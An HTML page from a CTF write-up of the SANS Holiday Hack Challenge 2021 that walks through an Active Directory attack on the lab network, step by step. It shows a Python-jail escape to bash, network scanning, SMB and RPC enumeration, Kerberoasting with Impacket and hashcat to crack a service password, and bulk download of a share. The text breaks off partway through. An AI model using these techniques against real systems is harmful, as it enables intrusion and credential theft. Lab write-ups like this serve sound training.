@@ -1,0 +1,1069 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Windows AD Exploit &#8212; SANS Xmas Challenge 2021</title>
+    
+  <link rel="stylesheet" href="_static/css/index.73d71520a4ca3b99cfee5594769eaaae.css">
+
+    
+  <link rel="stylesheet"
+    href="_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    
+      
+  <link rel="stylesheet"
+    href="_static/vendor/open-sans_all/1.44.1/index.css">
+  <link rel="stylesheet"
+    href="_static/vendor/lato_latin-ext/1.44.1/index.css">
+
+    
+    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="_static/sphinx-book-theme.40e2e510f6b7d1648584402491bb10fe.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
+    <link rel="stylesheet" type="text/css" href="_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
+    
+  <link rel="preload" as="script" href="_static/js/index.3da636dd464baa7582d2.js">
+
+    <script id="documentation_options" data-url_root="./" src="_static/documentation_options.js"></script>
+    <script src="_static/jquery.js"></script>
+    <script src="_static/underscore.js"></script>
+    <script src="_static/doctools.js"></script>
+    <script src="_static/language_data.js"></script>
+    <script src="_static/togglebutton.js"></script>
+    <script src="_static/clipboard.min.js"></script>
+    <script src="_static/copybutton.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="_static/sphinx-book-theme.d31b09fe5c1d09cb49b26a786de4a05d.js"></script>
+    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
+    <script >
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="9. Splunk!" href="objective9.html" />
+    <link rel="prev" title="HoHo… No (Fail2Ban)" href="prechallenge8.html" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="en" />
+
+
+
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+<a class="navbar-brand text-wrap" href="index.html">
+  
+  <img src="_static/logo.png" class="logo" alt="logo">
+  
+  
+  <h1 class="site-logo" id="site-title">SANS Xmas Challenge 2021</h1>
+  
+</a>
+</div><form class="bd-search d-flex align-items-center" action="search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form>
+<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
+    <ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="intro.html">
+   Christmas Challenge 2021 Report
+  </a>
+ </li>
+</ul>
+<ul class="current nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="objective1.html">
+   1. The Beginning
+  </a>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective2.html">
+   2. Caramel Santaigo
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge2.html">
+     Exif Metadata
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge2.html">
+     Track the Elf!
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective3.html">
+   3. Thaw Frost Tower’s Entrance
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge3.html">
+     Grepping for Gold
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge3.html">
+     WiFi &amp; Door Defrost
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective4.html">
+   4. Slot Machine Investigation
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge4.html">
+     Logic Munchers
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge4.html">
+     Slot Machine Hijack
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective5.html">
+   5. Strange USB Device
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge5.html">
+     IPv6 Sandbox
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge5.html">
+     Rubber Ducky
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective6.html">
+   6. Shellcode Primer
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge6.html">
+     Holiday Hero
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge6.html">
+     Assembly x86
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective7.html">
+   7. Printer Exploitation
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge7.html">
+     Printer Exploitation
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 current active collapsible-parent">
+  <a class="reference internal" href="objective8.html">
+   8. Kerberoasting
+  </a>
+  <ul class="current collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge8.html">
+     HoHo… No (Fail2Ban)
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     Windows AD Exploit
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective9.html">
+   9. Splunk!
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge9.html">
+     YARA Analysis
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge9.html">
+     Splunk
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective10.html">
+   10. Now Hiring!
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge10.html">
+     IMDS Exploration
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge10.html">
+     Frost Tower Challenge
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective11.html">
+   11. Customer Complaint Analysis
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge11.html">
+     Strace Ltrace Retrace
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge11.html">
+     Wireshark
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective12.html">
+   12. Frost Tower Website Checkup
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge12.html">
+     Python Game
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge12.html">
+     SQL Injection
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+ <li class="toctree-l1 collapsible-parent">
+  <a class="reference internal" href="objective13.html">
+   13. FPGA Programming
+  </a>
+  <ul class="collapse-ul">
+   <li class="toctree-l2">
+    <a class="reference internal" href="prechallenge13.html">
+     FPGA Programming - Prechallenge
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="challenge13.html">
+     FPGA Programming - Challenge
+    </a>
+   </li>
+  </ul>
+  <i class="fas fa-chevron-down">
+  </i>
+ </li>
+</ul>
+
+</nav> <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="row topbar fixed-top container-xl">
+    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
+    </div>
+    <div class="col pl-2 topbar-main">
+        
+        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+            <i class="fas fa-bars"></i>
+            <i class="fas fa-arrow-left"></i>
+            <i class="fas fa-arrow-up"></i>
+        </button>
+        
+        
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="_sources/challenge8.md"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.md</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+</div>
+
+        <!-- Source interaction buttons -->
+
+
+        <!-- Full screen (wrap in <a> to have style consistency -->
+        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+                data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
+                title="Fullscreen mode"><i
+                    class="fas fa-expand"></i></button></a>
+
+        <!-- Launch buttons -->
+
+    </div>
+
+    <!-- Table of contents -->
+    <div class="d-none d-md-block col-md-2 bd-toc show">
+        
+        <div class="tocsection onthispage pt-5 pb-3">
+            <i class="fas fa-list"></i> Contents
+        </div>
+        <nav id="bd-toc-nav">
+            <ul class="nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#the-internal-network">
+   the internal network
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#id1">
+     10.128.1.0/24
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#id2">
+     10.128.2.0/24
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#id3">
+     10.128.3.0/24
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#rpcclient-info">
+   rpcclient info
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#smbclient">
+   smbclient
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#impacket">
+   impacket
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#hashcat">
+   hashcat
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#smbclient-again">
+   smbclient again
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#powershell">
+   powershell
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#ldapdomaindump">
+   ldapdomaindump
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#the-research-dep">
+   The Research Dep.
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#santa-pdf-finally">
+   Santa PDF finally!
+  </a>
+ </li>
+</ul>
+
+        </nav>
+        
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="section" id="windows-ad-exploit">
+<span id="ch8"></span><h1>Windows AD Exploit<a class="headerlink" href="#windows-ad-exploit" title="Permalink to this headline">¶</a></h1>
+<p>Talk: <a class="reference external" href="https://www.youtube.com/watch?v=iMh8FTzepU4">https://www.youtube.com/watch?v=iMh8FTzepU4</a></p>
+<p><a class="reference external" href="https://register.elfu.org/register">(https://register.elfu.org/register)</a>
+<img alt="portal" src="_images/elfu-portal.png" /></p>
+<p>we have to register in oder to get an account. The email you enter doesn’t matter
+so let’s register and get credentials.</p>
+<p>we connect in ssh on the server and we got stuck in a screen like this:
+<img alt="screensplash" src="_images/elfu-screen.png" /></p>
+<p>looking at portal server we saw it was served by a Python backend, so to try to close the screensplash
+we just replied to the question: “how do you get out of a python program?”
+CTRL-D !!! and it worked :)</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>: Traceback (most recent call last):
+  File &quot;/opt/grading_system&quot;, line 41, in &lt;module&gt;
+    main()
+  File &quot;/opt/grading_system&quot;, line 26, in main
+    a = input(&quot;: &quot;).lower().strip()
+EOFError
+&gt;&gt;&gt; import os 
+&gt;&gt;&gt; os.system(&#39;/bin/bash&#39;)
+fbsjgeyymg@grades:~$ 
+</pre></div>
+</div>
+<p>we gained a shell on the machine. ok .. the challenge can start ..</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>fbsjgeyymg@grades:~$ ls -la
+total 28
+drwxr-x--- 3 fbsjgeyymg fbsjgeyymg 4096 Dec 29 16:58 .
+drwxr-xr-x 1 root       root       4096 Dec 29 17:03 ..
+-rw-r--r-- 1 fbsjgeyymg fbsjgeyymg  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 fbsjgeyymg fbsjgeyymg 3771 Feb 25  2020 .bashrc
+drwx------ 2 fbsjgeyymg fbsjgeyymg 4096 Dec 29 16:58 .cache
+-rw-rw---- 1 fbsjgeyymg fbsjgeyymg  247 Dec 29 16:58 .grades
+-rw-r--r-- 1 root       root          0 Dec 29 16:57 .hushlogin
+-rw-r--r-- 1 fbsjgeyymg fbsjgeyymg  807 Feb 25  2020 .profile
+</pre></div>
+</div>
+<p>nothing incredible here ..
+let’s look around in the network and get together some info gathering ..</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>bsjgeyymg@grades:~$ ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+</pre></div>
+</div>
+<p>ok and there is a kindly nmap available, well</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nmap 172.17.0.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-29 17:26 UTC
+Nmap scan report for 172.17.0.1
+Host is up (0.00055s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report for grades.elfu.local (172.17.0.2)
+Host is up (0.00058s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for 172.17.0.3
+Host is up (0.00056s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap scan report for 172.17.0.4
+Host is up (0.00061s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+Nmap scan report for 172.17.0.5
+Host is up (0.00059s latency).
+Not shown: 988 closed ports
+PORT     STATE SERVICE
+42/tcp   open  nameserver
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+636/tcp  open  ldapssl
+1024/tcp open  kdm
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+</pre></div>
+</div>
+<p>smbclient failed, it seems we cannot connect to the shares from here</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">smbclient</span> <span class="o">-</span><span class="n">L</span> <span class="mf">172.17.0.5</span> <span class="o">-</span><span class="n">p</span> <span class="mi">455</span>
+<span class="n">do_connect</span><span class="p">:</span> <span class="n">Connection</span> <span class="n">to</span> <span class="mf">172.17.0.5</span> <span class="n">failed</span> <span class="p">(</span><span class="n">Error</span> <span class="n">NT_STATUS_CONNECTION_REFUSED</span><span class="p">)</span>
+</pre></div>
+</div>
+<div class="section" id="the-internal-network">
+<h2>the internal network<a class="headerlink" href="#the-internal-network" title="Permalink to this headline">¶</a></h2>
+<p>there are other networks then?</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ route -n 
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+0.0.0.0         172.17.0.1      0.0.0.0         UG    0      0        0 eth0
+10.128.1.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+10.128.2.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+10.128.3.0      172.17.0.1      255.255.255.0   UG    0      0        0 eth0
+172.17.0.0      0.0.0.0         255.255.0.0     U     0      0        0 eth0
+</pre></div>
+</div>
+<p>yep! We can reach 3 other internal networks from here.</p>
+<div class="section" id="id1">
+<h3>10.128.1.0/24<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nmap 10.128.1.0/24 
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-29 17:46 UTC
+Nmap scan report for hhc21-windows-linux-docker.c.holidayhack2021.internal (10.128.1.4)
+Host is up (0.0016s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-07 16:54 UTC
+Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
+Host is up (0.00060s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+</pre></div>
+</div>
+<p>there is a Domain Controller on 10.128.1.53</p>
+</div>
+<div class="section" id="id2">
+<h3>10.128.2.0/24<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ nmap 10.128.2.0/24 
+long list of clients
+...
+</pre></div>
+</div>
+</div>
+<div class="section" id="id3">
+<h3>10.128.3.0/24<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
+<p>there is a really interesting server on the third network too</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ namp 10.128.3.30 -Pn
+Nmap scan report for 10.128.3.30
+Host is up (0.00080s latency).
+Not shown: 966 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+636/tcp  open  ldapssl
+1024/tcp open  kdm
+1025/tcp open  NFS-or-IIS
+1026/tcp open  LSA-or-nterm
+1027/tcp open  IIS
+1028/tcp open  unknown
+1029/tcp open  ms-lsa
+1030/tcp open  iad1
+1031/tcp open  iad2
+1032/tcp open  iad3
+1033/tcp open  netinfo
+1034/tcp open  zincite-a
+1035/tcp open  multidropper
+1036/tcp open  nsstp
+1037/tcp open  ams
+1038/tcp open  mtqp
+1039/tcp open  sbl
+1040/tcp open  netsaint
+1041/tcp open  danf-ak2
+1042/tcp open  afrog
+1043/tcp open  boinc
+1044/tcp open  dcutility
+2222/tcp open  EtherNetIP-1
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="rpcclient-info">
+<h2>rpcclient info<a class="headerlink" href="#rpcclient-info" title="Permalink to this headline">¶</a></h2>
+<p>Let’s gather together some more info by using <code class="docutils literal notranslate"><span class="pre">rpcclient</span></code></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ rpcclient 10.128.3.30
+Enter WORKGROUP\nrfcofddsg&#39;s password: 
+rpcclient $&gt; querydominfo
+Domain:		ELFU
+Server:		
+Comment:	
+Total Users:	494
+Total Groups:	18
+Total Aliases:	33
+Sequence No:	0
+Force Logoff:	-1
+Domain Server State:	0x0
+Server Role:	ROLE_DOMAIN_BDC
+Unknown 3:	0x0
+rpcclient $&gt; srvinfo
+	SHARE30        Wk Sv PrQ Unx NT SNT Samba 4.3.11-Ubuntu
+	platform_id     :	500
+	os version      :	6.1
+	server type     :	0x809a03
+rpcclient $&gt; enumdomains
+name:[ELFU] idx:[0x0]
+name:[BUILTIN] idx:[0x1]
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>rpcclient 10.128.1.53
+Enter WORKGROUP\nrfcofddsg&#39;s password: 
+rpcclient $&gt; querydominfo
+Domain:		ELFU
+Server:		
+Comment:	
+Total Users:	519
+Total Groups:	0
+Total Aliases:	10
+Sequence No:	1
+Force Logoff:	-1
+Domain Server State:	0x1
+Server Role:	ROLE_DOMAIN_PDC
+Unknown 3:	0x1
+rpcclient $&gt; srvinfo
+	10.128.1.53    Wk Sv PDC Tim NT     
+	platform_id     :	500
+	os version      :	10.0
+	server type     :	0x80102b
+</pre></div>
+</div>
+</div>
+<div class="section" id="smbclient">
+<h2>smbclient<a class="headerlink" href="#smbclient" title="Permalink to this headline">¶</a></h2>
+<p>In a Windows network first thing to look for are for sure the shares. From a linux box we can use the <code class="docutils literal notranslate"><span class="pre">smbclient</span></code> command to connect to windows shares
+on 10.128.3.30</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ smbclient -L 10.128.3.30 -p 445
+Enter WORKGROUP\fbsjgeyymg&#39;s password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	netlogon        Disk      
+	sysvol          Disk      
+	elfu_svc_shr    Disk      elfu_svc_shr
+	research_dep    Disk      research_dep
+	IPC$            IPC       IPC Service (Samba 4.3.11-Ubuntu)
+SMB1 disabled -- no workgroup available
+</pre></div>
+</div>
+<p>it could be useful to have an access to the <strong>elfu_svc_shr</strong> and <strong>research_dep</strong> shares.</p>
+<p>let’s go back to the domain controller and see if we can obtain someuseful creds.</p>
+</div>
+<div class="section" id="impacket">
+<h2>impacket<a class="headerlink" href="#impacket" title="Permalink to this headline">¶</a></h2>
+<p>we have some docs here to read:
+<a class="reference external" href="https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">(Kerbero Cheatsheet)</a>
+<a class="reference external" href="https://github.com/SecureAuthCorp/impacket/blob/cd4fe47cfcb72d7d35237a99e3df95cedf96e94f/examples/GetUserSPNs.py">Impacket</a></p>
+<p>and we can use the script GetUserSPNs.py to find Service Principal Names that are associated with our user account
+and run it against the Domain Controller</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python3 GetUserSPNs.py -outputfile output.txt -dc-ip 10.128.1.53 ELFU.local/dcvcskikmq:&#39;Gvogcgrrp@&#39; -request
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName                 Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
+-----------------------------------  --------  --------  --------------------------  ---------  ----------
+ldap/elfu_svc/elfu                   elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt;               
+ldap/elfu_svc/elfu.local             elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt;               
+ldap/elfu_svc.elfu.local/elfu        elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt;               
+ldap/elfu_svc.elfu.local/elfu.local  elfu_svc            2021-10-29 19:25:04.305279  &lt;never&gt; 
+
+</pre></div>
+</div>
+<p>the script saved the hash of the service account found in the output.txt file.<br/>
+Time to try to crack the hash.</p>
+</div>
+<div class="section" id="hashcat">
+<h2>hashcat<a class="headerlink" href="#hashcat" title="Permalink to this headline">¶</a></h2>
+<p>taken from hints to build our hashcat rule:</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Hashcat Mangling Rules</p>
+<p>From: Eve Snowshoes</p>
+<p><a class="reference external" href="https://github.com/NotSoSecure/password_cracking_rules">(OneRuleToRuleThemAll.rule)</a> is great for mangling when a password dictionary isn’t enough.</p>
+</div>
+<p>Password Cracking</p>
+<p>First we have to build up a password list. We use the awsome tool found in the hints <code class="docutils literal notranslate"><span class="pre">cewl</span></code> that is able to build a list
+of possible password extracted from a site just by  giving it the url.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$sudo apt-get install ruby
+git clone https://github.com/digininja/CeWL.git
+$sudo gem install nokogiri
+./cewl.rb –with-numbers https://register.elfu.org/register &gt; ch8_dict.txt
+</pre></div>
+</div>
+<p>once we have the worldlist we like, then ….. we are ready to crack it!</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$hashcat64.exe -m 13100 -a 0 .\spns.txt -r rules\OneRuleToRuleThemAll.rule -o craccato.txt .\ch8_dict.txt -O
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>OUTPUT:
+$krb5tgs$23$*elfu_svc$ELFU.LOCAL$ELFU.local/elfu_svc*$aa5230518cc7587d7f56d14450a8………90b4c278c73c4975a:Snow2021!
+</pre></div>
+</div>
+<p>so we know a share and we have a password .. let’s try it</p>
+</div>
+<div class="section" id="smbclient-again">
+<h2>smbclient again<a class="headerlink" href="#smbclient-again" title="Permalink to this headline">¶</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~$ smbclient  \\\\10.128.3.30\\elfu_svc_shr -U ELFU.local\\elfu_svc
+Enter ELFU.LOCAL\elfu_svc&#39;s password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Wed Dec 29 08:01:30 2021
+  Get-NavArtifactUrl.ps1              N     2018  Wed Oct 27 19:12:43 2021
+  Get-WorkingDirectory.ps1            N      188  Wed Oct 27 19:12:43 2021
+  Stop-EtwTraceCapture.ps1            N      924  Wed Oct 27 19:12:43 2021
+  create-knownissue-function.ps1      N     2104  Wed Oct 27 19:12:43 2021
+  PsTestFunctions.ps1                 N    52454  Wed Oct 27 19:12:43 2021
+  .......................
+  ......................
+</pre></div>
+</div>
+<p>there are a bunch of powershell scripts here.
+Try to get them on the linux box in order to grep them looking for some password or creds ..  (I love grep!!!!)
+<br>An interesting feature of smbclient <a class="reference external" href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">(found in samba docs)</a>
+is the tar option, allowing us to download in a tar all the files.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>iuwuvckfvi@grades:~/$ mkdir test &amp;&amp; cd test
+iuwuvckfvi@grades:~/test$ smbclient \\\\10.128.3.30\\elfu_svc_shr -U ELFU.local\\elfu_svc -Tc ./test.tar *
